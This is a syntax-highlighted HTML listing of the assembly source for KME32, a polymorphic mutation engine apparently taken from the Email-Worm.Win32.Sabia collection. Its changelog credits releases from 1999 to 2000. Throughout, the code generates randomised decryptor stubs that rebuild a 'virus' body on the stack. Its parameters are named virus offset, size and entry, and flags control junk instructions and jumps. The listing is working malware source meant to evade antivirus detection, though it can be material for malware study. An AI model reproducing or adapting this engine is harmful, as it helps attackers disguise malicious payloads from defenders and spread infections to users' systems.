<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Email-Worm.Win32.Sabia - _kme32.INC.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc7 {
	font-weight: bold;
	color: #0080C0;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;                                KME32 source</span><span class="sc0">
</span><span class="sc1">;                                ~~~~~~~~~~~~</span><span class="sc0">
</span><span class="sc1">; release 1.00 -- November'1999</span><span class="sc0">
</span><span class="sc1">;                  + permutable code (no data at all &amp; etc)</span><span class="sc0">
</span><span class="sc1">; release 2.00 -- August'00 by Vecna</span><span class="sc0">
</span><span class="sc1">;                  + movsx/zx</span><span class="sc0">
</span><span class="sc1">;                  + cmp r, r/c ; poly_cmd() ; jz/nz follow/nofollow</span><span class="sc0">
</span><span class="sc1">;                  + push r/c ; poly_cmd() ; pop r</span><span class="sc0">
</span><span class="sc1">;                  + subroutine</span><span class="sc0">
</span><span class="sc1">;                  + call subroutine</span><span class="sc0">
</span><span class="sc1">; release 3.00 -- November'00 -- repaired back ;-)</span><span class="sc0">
</span><span class="sc1">;                  + BSR/BSF, MUL/IMUL/DIV/IDIV</span><span class="sc0">
</span><span class="sc1">;                  + AND/OR in genvalue</span><span class="sc0">
</span><span class="sc1">;                  + short-consts (such as 'sub reg, nn'), see FLAG_NOSHORT_C</span><span class="sc0">
</span><span class="sc1">;                  + other-opcodes ('cmd reg,reg' with inverted S-bit), see FLAG_NOSWAP</span><span class="sc0">
</span><span class="sc1">;                  + jz/nz --&gt; jxx/nxx</span><span class="sc0">
</span><span class="sc1">;                  + subroutines/calls fixed, epilog-code fixed,</span><span class="sc0">
</span><span class="sc1">;                  + cycles</span><span class="sc0">
</span><span class="sc1">;                  + randomer fixed</span><span class="sc0">
</span><span class="sc1">;                  + now you can specify register values passed from engine</span><span class="sc0">
</span><span class="sc1">;                    into virus. 'exitregptr' parameter points to 8 dwords,</span><span class="sc0">
</span><span class="sc1">;                    eax/ecx/edx/ebx/esp/ebp/esi/edi.</span><span class="sc0">
</span><span class="sc1">;                    values, equal to -1, are unused.</span><span class="sc0">
</span><span class="sc1">;                    Also, only these registers are processed,</span><span class="sc0">
</span><span class="sc1">;                    which are specified in regavail bitset.</span><span class="sc0">
</span><span class="sc1">;                  + also, you can specify engine's initial register values.</span><span class="sc0">
</span><span class="sc1">;                    'initregptr' parameter points to 8 dwords,</span><span class="sc0">
</span><span class="sc1">;                    same as with exitregptr parameter.</span><span class="sc0">
</span><span class="sc1">;                  + FPU (sin,cos)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

                        </span><span class="sc5">p586</span><span class="sc0">

</span><span class="sc1">;LITE                   equ     ?       ; LITE: disable cmdavails &amp; flags</span><span class="sc0">

</span><span class="sc5">C_EIP_MAX_ITER</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">10000</span><span class="sc0">           </span><span class="sc1">; these parameters used to</span><span class="sc0">
</span><span class="sc5">C_EIP_TOP</span><span class="sc0">               </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">32</span><span class="sc0">              </span><span class="sc1">; find new JMP location</span><span class="sc0">
</span><span class="sc5">C_EIP_BOTTOM</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">32</span><span class="sc0">
</span><span class="sc5">C_EIP_PREV</span><span class="sc0">              </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">10</span><span class="sc0">
</span><span class="sc5">C_EIP_NEXT</span><span class="sc0">              </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">20</span><span class="sc0">

</span><span class="sc5">C_MAX_SUB</span><span class="sc0">               </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">32</span><span class="sc0">      </span><span class="sc1">; max # of subroutines</span><span class="sc0">



</span><span class="sc5">testcmd</span><span class="sc0">                 </span><span class="sc9">macro</span><span class="sc0">   </span><span class="sc5">fl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">lbl</span><span class="sc0">
</span><span class="sc9">IFNDEF</span><span class="sc0">  </span><span class="sc5">LITE</span><span class="sc0">
                        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc5">cmdavail</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">fl</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">lbl</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0">
                        </span><span class="sc9">endm</span><span class="sc0">

</span><span class="sc5">testcmd2</span><span class="sc0">                </span><span class="sc9">macro</span><span class="sc0">   </span><span class="sc5">fl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">lbl</span><span class="sc0">
</span><span class="sc9">IFNDEF</span><span class="sc0">  </span><span class="sc5">LITE</span><span class="sc0">
                        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc5">cmdavail2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">fl</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">lbl</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0">
                        </span><span class="sc9">endm</span><span class="sc0">

</span><span class="sc5">flagsz</span><span class="sc0">                  </span><span class="sc9">macro</span><span class="sc0">   </span><span class="sc5">fl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">lbl</span><span class="sc0">
</span><span class="sc9">IFNDEF</span><span class="sc0">  </span><span class="sc5">LITE</span><span class="sc0">
                        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc5">flags</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">fl</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">lbl</span><span class="sc0">
</span><span class="sc9">ELSE</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">lbl</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0">
                        </span><span class="sc9">endm</span><span class="sc0">

</span><span class="sc5">flagsnz</span><span class="sc0">                 </span><span class="sc9">macro</span><span class="sc0">   </span><span class="sc5">fl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">lbl</span><span class="sc0">
</span><span class="sc9">IFNDEF</span><span class="sc0">   </span><span class="sc5">LITE</span><span class="sc0">
                        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc5">flags</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">fl</span><span class="sc0">
                        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">lbl</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0">
                        </span><span class="sc9">endm</span><span class="sc0">

</span><span class="sc5">kme_start</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">kme_main</span><span class="sc0">                </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">pascal</span><span class="sc0">

                        </span><span class="sc1">; parameters -- pushed in reversed order</span><span class="sc0">
                        </span><span class="sc5">arg</span><span class="sc0">     </span><span class="sc5">exitregptr</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc1">; 0 or pointer to 8 dwords</span><span class="sc0">
                        </span><span class="sc5">arg</span><span class="sc0">     </span><span class="sc5">initregptr</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc1">; 0 or pointer to 8 dwords</span><span class="sc0">
                        </span><span class="sc5">arg</span><span class="sc0">     </span><span class="sc5">i_offs</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">    </span><span class="sc1">; virus offset</span><span class="sc0">
                        </span><span class="sc5">arg</span><span class="sc0">     </span><span class="sc5">i_size</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">    </span><span class="sc1">; virus size</span><span class="sc0">
                        </span><span class="sc5">arg</span><span class="sc0">     </span><span class="sc5">i_entry</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">   </span><span class="sc1">; virus entry (relative)</span><span class="sc0">
                        </span><span class="sc5">arg</span><span class="sc0">     </span><span class="sc5">o_offs</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">    </span><span class="sc1">; output offset</span><span class="sc0">
                        </span><span class="sc5">arg</span><span class="sc0">     </span><span class="sc5">o_max</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">     </span><span class="sc1">; output max buf size</span><span class="sc0">
                        </span><span class="sc5">arg</span><span class="sc0">     </span><span class="sc5">o_fillchar</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc1">; character to fill out buf</span><span class="sc0">
                        </span><span class="sc5">arg</span><span class="sc0">     </span><span class="sc5">po_size</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">   </span><span class="sc1">; 0 or pointer to out buf size</span><span class="sc0">
                        </span><span class="sc5">arg</span><span class="sc0">     </span><span class="sc5">po_entry</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">  </span><span class="sc1">; 0 or pointer to out entry (rel.)</span><span class="sc0">
                        </span><span class="sc5">arg</span><span class="sc0">     </span><span class="sc5">jmp_prob</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">  </span><span class="sc1">; JMPs if rnd(jmp_prob)==0</span><span class="sc0">
                        </span><span class="sc5">arg</span><span class="sc0">     </span><span class="sc5">randseed</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">  </span><span class="sc1">; randomer initializer</span><span class="sc0">
                        </span><span class="sc5">arg</span><span class="sc0">     </span><span class="sc5">regavail</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">  </span><span class="sc1">; register set (REG_XXX)</span><span class="sc0">
                        </span><span class="sc5">arg</span><span class="sc0">     </span><span class="sc5">cmdavail2</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc1">; adv. command set (CMD2_XXX)</span><span class="sc0">
                        </span><span class="sc5">arg</span><span class="sc0">     </span><span class="sc5">cmdavail</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">  </span><span class="sc1">; command set (CMD_XXX)</span><span class="sc0">
                        </span><span class="sc5">arg</span><span class="sc0">     </span><span class="sc5">flags</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">     </span><span class="sc1">; flags (FLAG_XXX)</span><span class="sc0">

                        </span><span class="sc1">; local variables</span><span class="sc0">
                        </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">save_esp</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">

                        </span><span class="sc1">;; "state" (size is DWORD-aligned)</span><span class="sc0">
                        </span><span class="sc1">;; state should be preserved when genereating subs</span><span class="sc0">
                        </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">state_end</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">
                        </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">regused</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">   </span><span class="sc1">; set of used registers</span><span class="sc0">
                        </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">reginit</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">   </span><span class="sc1">; set of initialized registers</span><span class="sc0">
                        </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">em_reg</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc4">:</span><span class="sc2">8</span><span class="sc0">  </span><span class="sc1">; register values (emulation)</span><span class="sc0">
                        </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">regbuf</span><span class="sc4">:</span><span class="sc10">BYTE</span><span class="sc4">:</span><span class="sc2">8</span><span class="sc0">   </span><span class="sc1">; indexes of regs to be pushed</span><span class="sc0">
                        </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">state_begin</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">
                        </span><span class="sc1">;;</span><span class="sc0">

                        </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">in_subroutine</span><span class="sc4">:</span><span class="sc10">BYTE</span><span class="sc0">   </span><span class="sc1">; inside-of-subroutine</span><span class="sc0">
                        </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">tempo</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">     </span><span class="sc1">; use in ifollow/rfollow only</span><span class="sc0">
                        </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">p_count</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">   </span><span class="sc1">; # of generated subs</span><span class="sc0">
                        </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">p_addr</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc4">:</span><span class="sc5">C_MAX_SUB</span><span class="sc0">
                        </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">p_stack</span><span class="sc4">:</span><span class="sc10">BYTE</span><span class="sc4">:</span><span class="sc5">C_MAX_SUB</span><span class="sc0">
                        </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">p_conv</span><span class="sc4">:</span><span class="sc10">BYTE</span><span class="sc4">:</span><span class="sc5">C_MAX_SUB</span><span class="sc0">

                        </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">jxxcond</span><span class="sc4">:</span><span class="sc10">BYTE</span><span class="sc4">:</span><span class="sc2">16</span><span class="sc0"> </span><span class="sc1">; flags, in perverted form</span><span class="sc0">
                        </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">fpuinit</span><span class="sc4">:</span><span class="sc10">BYTE</span><span class="sc0">
                        </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">fpustack</span><span class="sc4">:</span><span class="sc10">BYTE</span><span class="sc0">

                        </span><span class="sc6">pusha</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">save_esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">   </span><span class="sc1">; to jmp to @@error from subs</span><span class="sc0">

</span><span class="sc1">; fix regavail -- check if no registers given</span><span class="sc0">
                        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc5">regavail</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">REG_ALL</span><span class="sc0">       </span><span class="sc1">; clear ESP if set</span><span class="sc0">
                        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">@@regok</span><span class="sc0">
                        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc5">regavail</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">REG_DEFAULT</span><span class="sc0">
</span><span class="sc5">@@regok</span><span class="sc4">:</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">o_offs</span><span class="sc0">     </span><span class="sc1">; fill output buffer</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">o_max</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">o_fillchar</span><span class="sc0">
                        </span><span class="sc6">cld</span><span class="sc0">
                        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">stosb</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">in_subroutine</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">p_count</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">fpuinit</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">fpustack</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">

                        </span><span class="sc1">; while generation, EDI contains current outpointer</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">o_offs</span><span class="sc0">

                        </span><span class="sc1">; if need jmps &amp; (not FLAG_EIP0) select random EDI</span><span class="sc0">
                        </span><span class="sc5">flagsnz</span><span class="sc0"> </span><span class="sc5">FLAG_EIP0</span><span class="sc4">+</span><span class="sc5">FLAG_NOJMPS</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@@skipnew</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">po_entry</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">@@skipnew</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@find_new_eip</span><span class="sc0">
</span><span class="sc5">@@skipnew</span><span class="sc4">:</span><span class="sc0">

                        </span><span class="sc1">; calculate decryptor entry point</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">po_entry</span><span class="sc0">
                        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">@@skip_retentry</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">o_offs</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">@@skip_retentry</span><span class="sc4">:</span><span class="sc0">

                        </span><span class="sc1">; initialize bitsets: no registers initialized/used</span><span class="sc0">
                        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">reginit</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">regused</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc5">i_size</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">          </span><span class="sc1">; i_size: align 4</span><span class="sc0">
                        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc5">i_size</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@int3</span><span class="sc0">          </span><span class="sc1">; add INT3 if FLAG_DEBUG</span><span class="sc0">

                        </span><span class="sc1">; set initial register values</span><span class="sc0">

                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">initregptr</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">@@ir_done</span><span class="sc0">
                        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc5">@@ir_cycle</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">bt</span><span class="sc0">      </span><span class="sc5">regavail</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">@@ir_cont</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">initregptr</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">@@ir_cont</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">em_reg</span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                        </span><span class="sc6">bts</span><span class="sc0">     </span><span class="sc5">reginit</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc5">@@ir_cont</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
                        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">@@ir_cycle</span><span class="sc0">
</span><span class="sc5">@@ir_done</span><span class="sc4">:</span><span class="sc0">

                        </span><span class="sc1">; ECX contains number of elements in regbuf</span><span class="sc0">
                        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@poly_cmd</span><span class="sc0">      </span><span class="sc1">; add "logic" command</span><span class="sc0">

</span><span class="sc5">@@main_cycle</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc1">; main encryption cycle</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@get_init_reg</span><span class="sc0">  </span><span class="sc1">; select/initialize rnd reg</span><span class="sc0">
                        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@poly_cmd</span><span class="sc0">      </span><span class="sc1">; add "logic" command</span><span class="sc0">

                        </span><span class="sc1">; push registers until register in EBX become free</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@push_uptoebx</span><span class="sc0">

                        </span><span class="sc1">; get next dword (backward)</span><span class="sc0">
                        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc5">i_size</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">i_size</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">i_offs</span><span class="sc0">     </span><span class="sc1">; get dword into EDX</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@gen_value</span><span class="sc0">  </span><span class="sc1">; make em_reg[EBX] equal to EDX</span><span class="sc0">

                        </span><span class="sc6">bts</span><span class="sc0">     </span><span class="sc5">regused</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">    </span><span class="sc1">; mark reg in EBX as used</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">regbuf</span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0"> </span><span class="sc1">; store EBX as ready to push</span><span class="sc0">
                        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">

                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">i_size</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; until we still have dwords</span><span class="sc0">
                        </span><span class="sc6">jg</span><span class="sc0">      </span><span class="sc5">@@main_cycle</span><span class="sc0">    </span><span class="sc1">; in inputstream</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@push_all</span><span class="sc0">      </span><span class="sc1">; push all unpushed registers</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@int3</span><span class="sc0">          </span><span class="sc1">; add INT3 if FLAG_DEBUG</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@epilog</span><span class="sc0">        </span><span class="sc1">; "epilog" code -- JMP ESP</span><span class="sc0">

                        </span><span class="sc1">; calculate size of generated decryptor</span><span class="sc0">
                        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">o_offs</span><span class="sc0">
                        </span><span class="sc5">flagsnz</span><span class="sc0"> </span><span class="sc5">FLAG_NOJMPS</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@@nj</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">o_max</span><span class="sc0">
</span><span class="sc5">@@nj</span><span class="sc4">:</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">po_size</span><span class="sc0">
                        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">@@skip_osize</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc5">@@skip_osize</span><span class="sc4">:</span><span class="sc0">

                        </span><span class="sc6">clc</span><span class="sc0">                     </span><span class="sc1">; CF=0 - all ok</span><span class="sc0">

</span><span class="sc5">@@error_exit</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">popa</span><span class="sc0">                    </span><span class="sc1">; retore regs &amp; exit</span><span class="sc0">
                        </span><span class="sc6">ret</span><span class="sc0">

                        </span><span class="sc1">; error handler</span><span class="sc0">
</span><span class="sc5">@@error3</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc1">; int 3</span><span class="sc0">
</span><span class="sc5">@@error2</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc1">; int 3</span><span class="sc0">
</span><span class="sc5">@@error1</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc1">; int 3</span><span class="sc0">
</span><span class="sc5">@@error</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">save_esp</span><span class="sc0">   </span><span class="sc1">; rest. ESP (if call from sub)</span><span class="sc0">
                        </span><span class="sc6">stc</span><span class="sc0">                     </span><span class="sc1">; CF=1 - an error occured</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@error_exit</span><span class="sc0">

</span><span class="sc1">; ===================== subroutines =========================================</span><span class="sc0">

</span><span class="sc1">; add INT3 command (if FLAG_DEBUG)</span><span class="sc0">
</span><span class="sc5">@@int3</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc5">flagsz</span><span class="sc0">  </span><span class="sc5">FLAG_DEBUG</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@@skip_debug</span><span class="sc0">
</span><span class="sc5">@@int3_do</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc9">IFNDEF</span><span class="sc0">     </span><span class="sc5">LITE</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CCh</span><span class="sc0">
                        </span><span class="sc6">stosb</span><span class="sc0">
                        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0">
</span><span class="sc5">@@skip_debug</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">retn</span><span class="sc0">

